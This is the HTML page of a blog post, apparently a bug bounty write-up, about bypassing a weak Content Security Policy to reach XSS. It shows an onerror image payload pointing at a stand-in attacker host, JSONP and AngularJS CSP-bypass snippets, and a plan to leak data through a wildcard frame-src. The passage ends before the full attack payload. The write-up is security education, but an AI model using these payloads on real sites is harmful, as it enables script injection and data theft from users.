<!DOCTYPE html>
<html lang="en">
	<head>
		<meta charset="utf-8" />
		<link rel="icon" href="/favicon.ico" />
		<meta name="viewport" content="width=device-width, initial-scale=1" />
		<link rel="preload" href="/fonts/DM_Sans/DMSans-Regular.ttf" as="font" type="font/ttf" crossorigin>
		<link rel="stylesheet" href="/grid.css" type="text/css" />
		<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.2.0/styles/default.min.css">
		<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.2.0/highlight.min.js"></script>
		<link rel="stylesheet" href="/main.css" type="text/css" />
		<title>dubell.io | Exploiting weak Content Security Policy (CSP) rules for fun and profit</title>

		

		<link rel="modulepreload" href="/./_app/start-fbce9bfd.js">
		<link rel="modulepreload" href="/./_app/chunks/vendor-19ea2955.js">
		<link rel="modulepreload" href="/./_app/chunks/paths-45dac81d.js">
		<link rel="modulepreload" href="/./_app/pages/__layout.svelte-f9d100cb.js">
		<link rel="modulepreload" href="/./_app/pages/[slug].svelte-4c261885.js">
		<link rel="stylesheet" href="/./_app/assets/start-a8cd1609.css">

		<script type="module">
			import { start } from "/./_app/start-fbce9bfd.js";
			start({
				target: document.querySelector("#svelte"),
				paths: {"base":"","assets":"/."},
				session: {},
				host: location.host,
				route: true,
				spa: false,
				trailing_slash: "never",
				hydrate: {
					status: 200,
					error: null,
					nodes: [
						import("/./_app/pages/__layout.svelte-f9d100cb.js"),
						import("/./_app/pages/[slug].svelte-4c261885.js")
					],
					page: {
						host: location.host, // TODO this is redundant
						path: "/2016-07-21-exploiting-weak-content-security-policy-csp-rules-for-fun-and-profit",
						query: new URLSearchParams(""),
						params: {"slug":"2016-07-21-exploiting-weak-content-security-policy-csp-rules-for-fun-and-profit"}
					}
				}
			});
		</script>
	</head>
	<body>
		<div id="svelte">


<nav><div class="container"><div class="row"><div class="col"><span class="nav-title"><img src="data:image/png;base64,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" class="favicon" alt="Terminal Box"><a href="/">Hackity</a></span></div>
      <div class="col nav-links"><ul><li><a href="/articles">Scribbles</a></li>
              <li><a href="/about">About</a></li></ul></div></div></div></nav>



<div class="article-header"><div class="container"><div class="row"><div class="col"><h1 class="article-h1">Exploiting weak Content Security Policy (CSP) rules for fun and profit</h1>
          <p class="meta-info">By <strong>Author</strong> on July 26, 2021</p>
          <div class="tags"><div class="tag"><a href="/">Bug Bounty</a>
              </div><div class="tag"><a href="/">Web Application Security</a>
              </div></div>
          </div>
        </div></div></div>
  
<main><article><!-- HTML_TAG_START --><p>This article is based on my findings during a bug bounty. I was looking for any input bugs which could trigger a XSS but didn't find any until I tested the file upload functionality. Users had the option to drag&#x26;drop images into the company's website and place it in their gallery, however by specifying an image like this:</p>
<pre><code class="hljs language-html"><span class="hljs-tag">&#x3C;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"https://hackerdomain.hax/img.php"</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">"this.src=alert(1)"</span>/></span>
</code></pre>
<p>And dropping it into the website trigged an XSS.</p>
<p>Before I continue my report I will first cover what CSP is and what it tries to accomplish. If you feel you are already experienced in the area you can skip to the next section.</p>
<h2>What is CSP?</h2>
<p>Content Security Policy (CSP) is a client-side security model which allows developers to specify where different types of resources should be loaded, executed and embedded from. With CSP you can instruct the browser only to load javascript resources from a specific domain as well as block inline javascript running on the website. This is very helpful against XSS since most attacks requires inline javascript. There also the possibility to specify a <code>report-uri</code> which the browser uses to send detected policy violations <em>(of course this can be spoofed)</em>.</p>
<p>However CSP is only effective if used fully, i.e blocking inline javascript and loading resources from trusted domains. This requirement can be too strict for some websites, that's why there are certain work arounds such as using nonces that whitelists specific <code>&#x3C;script>&#x3C;/script></code> tags.</p>
<p>It should be noted that even using <em>trusted</em> sources wont always protect you. If JSONP is enabled or e.g. angularjs is hosted on the whitelisted source, it is possible to bypass CSP with the following:</p>
<h6>JSONP</h6>
<pre><code class="hljs language-xml"><span class="hljs-tag">&#x3C;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"https://whitelisted.com/jsonp?callback=alert"</span>></span>
</code></pre>
<h6>AngularJS</h6>
<pre><code class="hljs language-routeros">&#x3C;script <span class="hljs-attribute">src</span>=<span class="hljs-string">"https://whitelisted.com/angularjs/1.1.3/angularjs.min.js"</span>>
&#x3C;div ng-app ng-csp <span class="hljs-attribute">id</span>=p <span class="hljs-attribute">ng-click</span>=<span class="hljs-variable">$event</span>.view.alert(1)>
</code></pre>
<h2>Weaknesses</h2>
<p>As I mentioned earlier the company had employed CSP which is a good step in the right direction but because of its weak rules I could bypass it entirely and run whatever javascript I wanted once triggered.</p>
<p>Below you can see a copy of the CSP:</p>
<pre><code class="hljs language-vim">default-src <span class="hljs-string">'self'</span> http<span class="hljs-variable">s:</span>//*.company.<span class="hljs-keyword">com</span> http<span class="hljs-variable">s:</span>//*.companyimg.<span class="hljs-keyword">com</span>  *.company.<span class="hljs-keyword">com</span> *.companyimg.<span class="hljs-keyword">com</span> *.google.<span class="hljs-keyword">com</span> connect.facebook.net *.google-analytics.<span class="hljs-keyword">com</span> http<span class="hljs-variable">s:</span>//*.googleapis.<span class="hljs-keyword">com</span> *.gstatic.<span class="hljs-keyword">com</span> http<span class="hljs-variable">s:</span>//*.facebook.<span class="hljs-keyword">com</span> *.facebook.<span class="hljs-keyword">com</span> www.googleadservices.<span class="hljs-keyword">com</span> googleads.g.doubleclick.net platform.twitter.<span class="hljs-keyword">com</span> *.tiles.mapbox.<span class="hljs-keyword">com</span> *.online-metrix.net *.bnc.<span class="hljs-keyword">lt</span> bnc.<span class="hljs-keyword">lt</span> *.yozio.<span class="hljs-keyword">com</span> <span class="hljs-string">'unsafe-inline'</span> <span class="hljs-string">'unsafe-eval'</span>;

media-src <span class="hljs-string">'self'</span> *.companyimg.<span class="hljs-keyword">com</span> blo<span class="hljs-variable">b:</span>;

frame-src *;

connect-src <span class="hljs-string">'self'</span> *.mapbox.<span class="hljs-keyword">com</span> *.company.<span class="hljs-keyword">com</span> company.s3.amazonaws.<span class="hljs-keyword">com</span> ;

img-src * dat<span class="hljs-variable">a:</span>;
</code></pre>
<p>The <code>default-src</code> directive is set to only load resources from <em>self</em> and the other domains listed unless specified otherwise by other directives. If you haven't noticed it <code>unsafe-inline</code> and <code>unsafe-eval</code> is also present, which means running inline javascript is allowed <strong>by default</strong>.</p>
<p>Other directives that are of interest is the <code>frame-src</code> and <code>img-src</code> because they allow resources to be loaded from anywhere. By exploiting <code>unsafe-inline</code> and <code>unsafe-eval</code> for running inline javascript, <code>frame-src</code> for sending data to the attacker's domain and <code>img-src</code> to trigger the initial XSS we can deliver a powerful payload.</p>
<h2>The attack</h2>
<p>First we construct the image which the victim will drag&#x26;drop into their gallery:</p>
